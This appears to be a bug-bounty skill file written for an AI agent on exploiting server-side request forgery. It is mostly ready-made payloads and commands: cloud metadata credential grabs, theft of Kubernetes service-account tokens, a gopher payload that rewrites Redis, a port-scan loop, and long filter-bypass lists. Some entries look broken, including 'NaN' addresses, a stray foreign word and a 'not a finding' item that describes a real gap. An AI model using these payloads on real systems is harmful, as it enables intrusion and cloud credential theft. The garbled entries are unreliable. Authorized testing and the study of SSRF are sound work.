---
name: "server-side-request-forgery"
version: "2.0"
category: "injection"
subcategory: "ssrf"
phase: "exploitation"
tags: ["bug-bounty", "injection", "ssrf", "cloud-metadata", "kubernetes", "internal-pivot"]
tools: ["interactsh", "gopherus", "ssrfmap", "burp-collaborator"]
follow_up_skills: ["rce", "xxe", "lfi", "local-file-inclusion", "remote-code-execution", "information-disclosure-harvesting"]
prerequisite_skills: ["recon-endpoint"]
description: "Bug bounty skill: server side request forgery - exploitation phase, injection category"
---
# Server-Side Request Forgery (SSRF)

## Summary

SSRF occurs when an attacker can induce the server to make HTTP requests to arbitrary destinations. This allows attacks against internal services behind firewalls, cloud metadata endpoints, and otherwise inaccessible systems. In a successful SSRF attack, the attacker can force the server to connect to internal services within the organization's infrastructure, external systems on the internet, services on the same server (localhost), and cloud service provider metadata endpoints.

## Attack Surface

### Scope

- Outbound HTTP/HTTPS fetchers (proxies, previewers, importers, webhook testers)
- Non-HTTP protocols via URL handlers (gopher, dict, file, ftp, smb wrappers)
- Service-to-service hops through gateways and sidecars (envoy/nginx)
- Cloud and platform metadata endpoints, instance services, and control planes

### Direct URL Params

`url=`, `link=`, `fetch=`, `src=`, `webhook=`, `avatar=`, `image=`

### Indirect Sources

- Open Graph/link previews, PDF/image renderers
- Server-side analytics (Referer trackers), import/export jobs
- Webhooks/callback verifiers

### Protocol-Translating Services

- PDF via wkhtmltopdf/Chrome headless, image pipelines
- Document parsers, SSO validators, archive expanders

### Less Obvious

- GraphQL resolvers that fetch by URL
- Background crawlers, repository/package managers (git, npm, pip)
- Calendar (ICS) fetchers

## Key Concepts

- **SSRF against the server itself** — Loopback to `localhost`, `127.0.0.1`, `[::1]` to access services bound to the local interface
- **SSRF against other servers on the network** — Access internal infrastructure (databases, admin panels, cloud metadata, container orchestration)
- **Blind SSRF** — No response content visible; confirmed via OOB callback or timing
- **Basic SSRF** — Direct requests to internal/external resources with response visible
- **Semi-blind SSRF** — Limited information returned in responses
- **Time-based SSRF** — Detection through response timing differences
- **Out-of-band SSRF** — Secondary channel used for data exfiltration

## Technical Details

### SSRF Vectors

- **URL Input Fields**: Website preview generators, document/image imports from URLs, API integrations with external services, webhook configurations, export to PDF/screenshot functionality
- **Proxy Functionality**: Web proxies, content fetchers, API gateways, translation services
- **File Processing**: Media conversion tools, document processors, XML/JSON processors with external entity support
- **Integration Points**: Third-party service connections, cloud storage integrations, monitoring systems, webhook endpoints

### Cloud Metadata Endpoints

- **AWS IMDSv1**: `http://169.254.169.254/latest/meta-data/` → `/iam/security-credentials/{role}`, `/user-data`
- **AWS IMDSv2**: Requires token via `PUT /latest/api/token` with header `X-aws-ec2-metadata-token-ttl-seconds`, then include `X-aws-ec2-metadata-token` on subsequent GETs. If sink cannot set headers or methods, seek intermediaries that can.
- **ECS/EKS Task Credentials**: `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`
- **Azure**: `http://169.254.169.254/metadata/instance` (requires header `Metadata: true` and `api-version`; alternate IP `http://168.63.129.16/metadata/instance`). MSI OAuth: `/metadata/identity/oauth2/token`
- **DigitalOcean**: `http://169.254.169.254/metadata/v1.json`
- **Google Cloud**: `http://metadata.google.internal/computeMetadata/v1/` (requires header `Metadata-Flavor: Google`). Target: `/instance/service-accounts/default/token`
- **Oracle Cloud**: `http://169.254.169.254/opc/v1/instance/`
- **Alibaba Cloud**: `http://100.100.100.200/latest/meta-data/`
- **Packet Cloud**: `https://metadata.packet.net/userdata`
- **OpenStack**: `http://169.254.169.254/openstack/latest/meta_data.json`

### Internal Service Targets

- Admin interfaces: `http://localhost:8080/admin`
- Databases: `http://localhost:3306` (MySQL), `http://localhost:27017` (MongoDB)
- Caching servers: `http://localhost:6379` (Redis), `http://localhost:11211` (Memcached)
- Management APIs: `http://localhost:8500` (Consul)
- Development servers: `http://localhost:3000`, `http://localhost:8000`
- Docker API: `http://localhost:2375/v1.24/containers/json` (no TLS variants often internal-only)
- Elasticsearch/OpenSearch: `http://localhost:9200/_cat/indices`
- Message brokers/admin UIs: RabbitMQ, Kafka REST, Celery/Flower, Jenkins crumb APIs
- FastCGI/PHP-FPM: `gopher://localhost:9000/` (craft records for file write/exec when app routes to FPM)

### Protocol Abuse

- `file:///etc/passwd`
- `dict://localhost:6379/info`
- `gopher://localhost:25/`
- `tftp://localhost:69/`
- `ldap://localhost:389/`
- `unix:///var/run/docker.sock`

### Framework-Specific SSRF

- **Node.js**: Axios validation bypass, `http-proxy` misconfigurations, `request` module vulnerabilities, Axios path-relative URL bypass (CVE-2024-39338 — upgrade to >= 1.7.4)
- **Python**: `requests` library security considerations, `urllib` parsing inconsistencies, Flask/Django SSRF prevention
- **Java**: `URLConnection` security practices, Spring framework protections, Apache HttpClient considerations, Apache CXF Aegis databinding SSRF (CVE-2024-28752)

### Kubernetes SSRF Attack Surface

#### Service Account Token Theft

Extract the service account token from the container's filesystem:

```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
```

Use the token to access the Kubernetes API:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods
curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

#### Kubelet API

```
http://127.0.0.1:10250/pods
http://127.0.0.1:10255/pods
http://127.0.0.1:10250/run/<namespace>/<pod>/<container> -d "cmd=id"
```

#### Service Mesh Metadata

**Istio/Envoy**:
```
http://127.0.0.1:15000/config_dump
http://127.0.0.1:15000/clusters
http://127.0.0.1:15000/stats
http://127.0.0.1:15000/certs
http://127.0.0.1:15001/
http://127.0.0.1:8080/debug/endpointz
http://127.0.0.1:8080/debug/configz
```

**Linkerd**: `http://127.0.0.1:4191/metrics`, `http://127.0.0.1:4191/ready`, `http://127.0.0.1:4140/`

**Consul Connect**: `http://127.0.0.1:8500/v1/agent/self`, `http://127.0.0.1:8500/v1/catalog/services`

#### Container Runtime Socket

```
unix:///var/run/docker.sock
unix:///run/containerd/containerd.sock
unix:///var/run/crio/crio.sock
```

#### Kubernetes Dashboard and Management Tools

```
http://kubernetes-dashboard.kube-system.svc.cluster.local
http://prometheus.monitoring.svc.cluster.local:9090
http://grafana.monitoring.svc.cluster.local:3000
http://argocd-server.argocd.svc.cluster.local
http://rancher.cattle-system.svc.cluster.local
```

## Key Vulnerabilities

### Protocol Exploitation

- **Gopher**: Speak raw text protocols (Redis/SMTP/IMAP/HTTP/FCGI). Use to craft multi-line payloads, schedule cron via Redis, or build FastCGI requests for file write/exec.
- **File and Wrappers**: `file:///etc/passwd`, `file:///proc/self/environ`, `jar:`, `netdoc:`, `smb://` and language-specific wrappers (`php://`, `expect://`) where enabled.

### Address Variants

- Loopback: `127.0.0.1`, `127.1`, `2130706433`, `0x7f000001`, `::1`, `[::ffff:127.0.0.1]`
- RFC1918/link-local: `10/8`, `172.16/12`, `192.168/16`, `169.254/16`
- Test IPv6-mapped and mixed-notation forms

### URL Confusion

- Userinfo and fragments: `http://internal@attacker/` or `http://attacker#@internal/`
- Scheme-less/relative forms the server might complete internally: `//169.254.169.254/`
- Trailing dots and mixed case: `internal.` vs `INTERNAL`, Unicode dot lookalikes

### Redirect Abuse

- Allowlist only applied pre-redirect: 302 from attacker → internal host
- Test multi-hop and protocol switches (http→file/gopher via custom clients)
- **Status code filtering bypass**: Some filters block 301/302 but follow 303 (See Other) without re-validation
- **Trusted service chains**: Gravatar → WordPress CDN → arbitrary host (GitLab #878779)
- PHP redirect script with 303: `header('Location: http://169.254.169.254/latest/meta-data/', true, 303);`

### Header and Method Control

- Some sinks reflect or allow CRLF-injection into the request line/headers
- If arbitrary headers/methods are possible, IMDSv2, GCP, and Azure metadata become reachable

### File Processing SSRF

- **FFmpeg HLS**: Upload AVI with embedded HLS directives - FFmpeg follows HTTP URLs in `#EXTINF` segments
- **ImageMagick SVG**: SVGs with `href` to external URLs or UNC paths (`\\attacker\share\file`)
- **LibreOffice**: Office file processing triggers CVE-2019-17400 URL handling漏洞
- **Video transcoding**: Upload functions that process media files fetch external content
- **Project import**: CarrierWave `remote_attribute_url=` downloads files from attacker URLs
- **PDF generation**: Template injection via `<iframe>` tags in error messages (HackerOne #2262382)

### Blind SSRF via Integrations

- **Link previews**: Matrix `preview_url`, Slack unfurl, Discord embeds
- **Webhook delivery**: Outbound requests to attacker-controlled URLs
- **Sentry error reporting**: Source code scraping follows URLs in stack traces
- **GraphQL parameters**: Queries accepting URL-like parameters
- **OAuth callbacks**: `oauth_token_url` constructed from Host header

## Chaining Attacks

- SSRF → Metadata creds → cloud API access (list buckets, read secrets)
- SSRF → Redis/FCGI/Docker → file write/command execution → shell
- SSRF → Kubelet/API → pod list/logs → token/secret discovery → lateral movement

## Methodology

1. Map all application entry points accepting URLs, file paths, or hostnames — check URL input fields (website previews, URL imports, webhooks, PDF/screenshot export), proxy functionality (web proxies, content fetchers, API gateways, translation services), file processing (media converters, document processors, XML/JSON processors), and integration points (third-party services, cloud storage, monitoring, webhooks).
2. Identify all URL/hostname parameters: `url`, `dest`, `redirect`, `uri`, `path`, `continue`, `window`, `next`, `data`, `reference`, `site`, `html`, `val`, `validate`, `domain`, `callback`, `return`, `page`, `feed`, `host`, `port`, `to`, `out`, `view`, `dir`, `origin`, `source`, `endpoint`, `proxy`, `fetch`, `img_url`, `link`, `site_url`, `media_url`.
3. Set up an out-of-band detection server (Burp Collaborator, Interactsh, or a public server with unique URL).
4. Test with a benign external URL (`https://your-server.com/ssrf-test`) and analyze responses for time differences, error messages, content leakage, and callbacks.
5. Test internal resource access using common addresses — loopback interfaces (`http://localhost:port`, `http://127.0.0.1:port`, `http://0.0.0.0:port`, `http://[::1]:port`), internal IP ranges (`10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`), and cloud metadata endpoints. Check for response differences across different hosts/ports.
6. Test for blind SSRF using time delays via services like `http://slowwly.robertomurray.co.uk/delay/5000/url/http://www.google.com`.
7. Confirm protocol support by testing `file:///etc/passwd`, `gopher://localhost:25/`, `dict://localhost:6379/info`, `tftp://localhost:69/`, `ldap://localhost:389/`.
8. If SSRF protection (allowlist/denylist) is implemented, apply bypass techniques — allowlist bypass (open redirects, DNS spoofing, subdomain takeover, path traversal), denylist bypass (alternate IP representations, IPv6 variations, domain tricks, URL encoding, schema confusion), and uncommon bypasses (DNS rebinding, double encoding, unicode normalization, protocol downgrading, host header abuse, HTTP/2 coalescing, h2c upgrade).
9. Escalate the SSRF: port scan internal hosts, access cloud metadata (including IMDSv2 two-step flow for AWS), exploit protocol-specific features (Redis via Gopher), extract Kubernetes service account tokens, probe service mesh endpoints, and pivot to internal services.

## Detection Commands

### Blind SSRF Detection

```bash
curl -X POST -d 'url=http://your-interactsh-server' https://target.com/fetch
```

### Time-Based Detection

```bash
curl -s "http://target.com/api?url=http://slowwly.robertomurray.co.uk/delay/5000/url/http://www.google.com"
```

### Port Scanning via SSRF

```bash
for port in {1..65535}; do
  curl -s "https://target.com/api?url=http://localhost:$port" -o /dev/null
  if [ $? -eq 0 ]; then echo "Port $port is open"; fi
done
```

### Cloud Metadata Access

```bash
# AWS IMDSv2 (two-step)
curl -s -X PUT "https://target.com/api?url=http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
curl -s "https://target.com/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE" \
  -H "X-aws-ec2-metadata-token: TOKEN"

# GCP
curl -s "https://target.com/api?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Azure
curl -s "https://target.com/api?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"
```

## Exploitation Payloads

### Gopher Protocol (Redis)

```
gopher://127.0.0.1:6379/_SET%20ssrfkey%20%22Hello%20SSRF%22%0D%0ACONFIG%20SET%20dir%20%2Ftmp%2F%0D%0ACONFIG%20SET%20dbfilename%20redis.dump%0D%0ASAVE%0D%0AQUIT
```

### PDF SSRF via SVG

```xml
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>
```

### File Access

```
file:///etc/passwd
file:///proc/self/environ
file:///var/www/html/config.php
file:///var/run/secrets/kubernetes.io/serviceaccount/token
```

### AWS IMDSv2 Token Acquisition

If the application supports custom HTTP methods or method override headers:

```json
POST /api/fetch
{
  "url": "http://169.254.169.254/latest/api/token",
  "method": "PUT",
  "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
}
```

## Commands

### DNS Rebinding with Modern Tools

```bash
# rbndr.us: alternates between external IP and internal IP
curl http://make-1.2.3.4-127.0.0.1-rbndr.us

# 1u.ms: alternates between external and localhost
curl http://1u.ms/A-127.0.0.1:1-2
```

### Kubernetes Token Extraction

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods
curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

## Tools

- **Burp Suite Extensions**: Collaborator, SSRF Scanner, Param Miner, Turbo Intruder
- **Specialized SSRF Tools**: SSRFmap, Gopherus, SSRF Sheriff, Interactsh
- **Network Utilities**: Netcat, TCPDump, Wireshark
- **Payload Generators**: PayloadsAllTheThings (SSRF section), FuzzDB
- **DNS Rebinding Tools**: 1u.ms, Singularity of Origin, rbndr.us, lockyfork/rebind (Docker), DNSRebindToolkit

## Bypass Techniques

### Allowlist Bypass

- Open Redirects: `https://allowed-domain.com/redirect?url=http://internal-server`
- DNS Spoofing: Register expired domains from allowlist
- Subdomain Takeover: Control subdomains of allowed domains
- Path Traversal: `https://allowed-domain.com@evil.com`

### Denylist Bypass

**Alternate IP Representations**:

```
http://127.0.0.1/
http://127.1/                          (shortened)
http://0/                              (shorthand for 0.0.0.0)
http://0177.0.0.1/                     (octal dotted)
http://0x7f.0.0.1/                     (hex dotted)
http://0x7f000001/                     (hex flat)
http://2130706433/                     (decimal)
http://0330.072.0326.0343              (octal dotted)
http://033016553343                    (octal flat)
http://0x0NaN0NaN
http://0xNaN.0xaN0NaN
http://NaN
http://0NaN
http://shmilon.0xNaN.undefined.undefined
http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37       (URL encoded)
http://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d
http://127%2e0%2e0%2e1/
http://%6c%6f%63%61%6c%68%6f%73%74/
```

**IPv6 Variations**:

```
http://[::1]/
http://[::127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://[::ffff:127.0.0.1]/           (IPv6-mapped IPv4)
http://[::ffff:7f00:1]/
http://[fe80::1%25lo0]:80            (zone-scoped IPv6)
```

**Domain Tricks**:

```
http://localhost.evil.com/           (attacker controls DNS)
http://spoofed-domain/               (modified /etc/hosts)
```

**Schema Confusion**:

```
http:////localhost/
```

**Weak Parser Exploits**:

```
http://127.0.0.1:80#@evil.com/
http://evil.com@127.0.0.1/
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
```

**Filter Bypass**:

```
0://evil.com:80;http://google.com:80/
```

**Unicode/IP Homoglyphs**:

```
http://①②⑦.⓪.⓪.①/
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
```

**Case Manipulation**: `http://LoCaLhOsT/`

**Non-Standard Ports**: Accessing standard services on non-standard ports

### DNS Rebinding

First resolution returns an allowed IP, second resolution returns an internal target. Use short TTL DNS records under attacker control.

```
http://make-1.2.3.4-127.0.0.1-rbndr.us
http://1u.ms/A-127.0.0.1:1-2
```

### URL Parser Differentials

Different parsing between the allowlist checker and the actual HTTP client/fetcher. Exploit inconsistencies in scheme, host, port, and path handling across frameworks.

### Redirect Chains

- Initial URL passes allowlist, redirect targets internal host
- Protocol downgrade/upgrade through redirects (http→file/gopher)
- Multi-hop across distinct subdomains and paths

### Blind SSRF

Use OAST (DNS/HTTP) to confirm egress. `interactsh-client -v` (running in the sandbox) gives you a unique `*.oast.fun` domain; embed it in the URL parameter and watch the interactsh stdout for the inbound DNS/HTTP hit. Each invocation yields a fresh domain — restart between payloads if you need to correlate hits to a specific request.

Derive internal reachability from timing, response size, TLS errors, and ETag differences. Build a port map by binary searching timeouts (short connect/read timeouts yield cleaner diffs).

### Uncommon Bypasses

- **Double URL Encoding**: Encode already encoded values
- **Unicode Normalization**: Using similar-looking characters
- **Protocol Downgrading**: Switching from https to http
- **Temporal Intents**: Reliance on stale DNS resolution
- **Host header abuse**: `Host:` or `X-Forwarded-Host:` against permissive back-end proxies
- **HTTP/2 Coalescing**: Re-used TLS connections between SAN-matched hostnames can bypass host-based filters
- **h2c Upgrade**: Clear-text HTTP/2 upgrade (`PRI * HTTP/2.0`) may slip past scheme filters
- **DNS-over-HTTPS**: `https://dns.google/resolve?name=...` to leak internal hostnames

### AWS IMDSv2 Bypass

IMDSv2 requires a session token before metadata access. If the application supports custom HTTP methods or method override headers:

1. Obtain session token via PUT:
   ```
   PUT http://169.254.169.254/latest/api/token
   X-aws-ec2-metadata-token-ttl-seconds: 21600
   ```
2. Use token for metadata access:
   ```
   GET /latest/meta-data/
   X-aws-ec2-metadata-token: TOKEN
   ```

Bypass scenarios:
- Application supports custom HTTP methods in SSRF
- HTTP parameter pollution (mixing GET with PUT semantics via parameter that accepts method)
- SSRF through applications that intentionally support PUT (webhooks, API gateways)
- Vulnerable proxy servers that forward `X-HTTP-Method-Override: PUT`

## Validation

- Prove an outbound server-initiated request occurred (OAST interaction or internal-only response differences)
- Show access to non-public resources (metadata, internal admin, service ports) from the vulnerable service
- Where possible, demonstrate minimal-impact credential access (short-lived token) or a harmless internal data read
- Confirm reproducibility and document request parameters that control scheme/host/headers/method and redirect behavior

## Not a Finding If

- Blocking only `169.254.169.254` misses other cloud metadata endpoints (Azure `168.63.129.16`, Alibaba `100.100.100.200`, ECS `169.254.170.2`).
- `Access-Control-Allow-Origin: *` with no `Access-Control-Allow-Credentials: true` is not exploitable for credentialed cross-origin requests.
- IMDSv2 on AWS requires a two-step token acquisition; a blind GET to `169.254.169.254/latest/meta-data/` may return empty without the token header.
- A redirect from an allowed domain to an internal IP is only exploitable if the server follows redirects without validating the final target.
- `file://` protocol access requires the server's HTTP client to support the file scheme (disabled in many modern HTTP libraries).
- Response time differences alone (without OOB callback or content) are inconclusive due to network latency variance.
- Client-side fetches only (no server request involved).
- Strict allowlists with DNS pinning and no redirect following.
- SSRF simulators/mocks returning canned responses without real egress.
- Blocked egress confirmed by uniform errors across all targets and protocols.
- OAST callbacks where the source IP matches the tester's machine, not the server — the browser or a client-side fetch made the request, not the backend.

## Notes

- SSRF is one of the highest severity vulnerabilities — often leads to cloud metadata credential theft.
- Cloud metadata endpoints vary by provider (AWS, GCP, Azure all use different IPs/paths).
- Always set up OOB listener before testing blind SSRF.
- Open redirects can chain with SSRF to bypass allowlists.
- Kubernetes pods with mounted service account tokens are a high-value SSRF escalation target.
- Docker socket exposure (`unix:///var/run/docker.sock`) is common in CI/CD environments.
- Use a trusted RFC-3986 parser for URL validation; simple string/regex checks are easily bypassed.
- Real-world examples: Capital One breach (2019, 100M+ records via metadata), Gitlab SSRF (2019, improper URL validation in import), Microsoft Purview SSRF (2025, misconfigured proxy endpoint allowing cross-tenant data exposure).

### Pro Tips

- Prefer OAST callbacks first; then iterate on internal addressing and protocols
- Test IPv6 and mixed-notation addresses; filters often ignore them
- Observe library/client differences (curl, Java HttpClient, Node, Go); behavior changes across services and jobs
- Redirects are leverage: control both the initial allowlisted host and the next hop
- Metadata endpoints require headers/methods; verify if your sink can set them or if intermediaries add them
- Use tiny payloads and tight timeouts to map ports with minimal noise
- When responses are masked, diff length/ETag/status and TLS error classes to infer reachability
- Chain quickly to durable impact (short-lived tokens, harmless internal reads) and stop there
- GCP `v1beta1` metadata endpoint does NOT require `Metadata-Flavor: Google` header (unlike `/v1`)
- Append `?alt=json` to GCP metadata responses to force JSON output (better for screenshot cropping)
- For blind SSRF: check webhook delivery logs, error messages, timing differences, `og:title` metadata leakage

### Escalation Ladder

1. **Blind callback** - Server fetches URL, confirmed via OOB (low bounty)
2. **Internal enumeration** - Partial data via error messages, timing, `og:title`
3. **Cloud metadata** - Service account tokens, SSH keys (bounty crosses $10k)
4. **Internal API abuse** - Kubernetes API, Jolokia/JMX, internal Grafana
5. **Full RCE** - Container escape, reverse shell via JVM agents

### Real-World RCE Chains

**Shopify #341876 ($25k)**: Screenshot rendering → GCP metadata (`v1beta1`) → kube-env → Kubectl certs → `exec` → root on every container

**Aiven #1547877 ($5k)**: Kafka Connect → Jolokia on `localhost:6725` → `jvmtiAgentLoad` → embed JAR in SQLite → reverse shell

### Impact

- Cloud credential disclosure with subsequent control-plane/API access
- Access to internal control panels and data stores not exposed publicly
- Lateral movement into Kubernetes, service meshes, and CI/CD
- RCE via protocol abuse (FCGI, Redis), Docker daemon access, or scriptable admin interfaces

## References

- https://portswigger.net/web-security/ssrf
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- https://github.com/reddelexc/hackerone-reports (313 SSRF reports dataset)

### Key HackerOne Reports

| Report | Upvotes | Bounty | Technique |
|--------|---------|--------|-----------|
| Shopify #341876 | 577 | $25k | Screenshot → GCP metadata → K8s → root |
| HackerOne #2262382 | 515 | $25k | PDF generation → iframe → AWS metadata |
| Snapchat #530974 | 417 | - | DNS rebinding → headless browser → SSH keys |
| GitLab #826361 | 356 | $10k | Project import → remote_attachment_url → SSRF |
| GitLab #632101 | 347 | - | DNS rebinding ToCToU (CVE-2019-5464) |
| Reddit #1960765 | 339 | $6k | Blind SSRF via Matrix preview_url |
| Vimeo #549882 | 275 | - | Upload → GCP metadata → SSH keys |
| GitLab #878779 | 228 | - | Redirect chain: Gravatar → i0.wp.com → internal |
| Omise #508459 | 212 | - | Webhook 303 redirect → AWS metadata |
| TikTok #1062888 | 156 | $2,727 | FFmpeg HLS processing → SSRF + LFI |
